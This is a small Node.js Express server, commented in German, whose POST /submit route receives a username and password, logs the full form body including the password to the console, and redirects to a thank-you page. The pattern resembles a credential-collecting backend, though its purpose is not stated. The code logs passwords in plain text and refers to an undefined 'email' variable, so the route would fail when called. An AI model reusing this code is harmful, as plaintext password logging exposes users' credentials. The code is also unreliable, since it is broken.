const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.post('/submit', (req, res) => {
  console.log("🔁 POST /submit wurde aufgerufen");
  console.log("Formulardaten:", req.body);

  const { username, password } = req.body;

  console.log("📧 E-Mail erhalten:", email);
  console.log("👤 Benutzername erhalten:", username);

 res.redirect('/danke.html');
});

app.listen(PORT, () => {
  console.log(`✅ Server läuft auf http://localhost:${PORT}`);
});
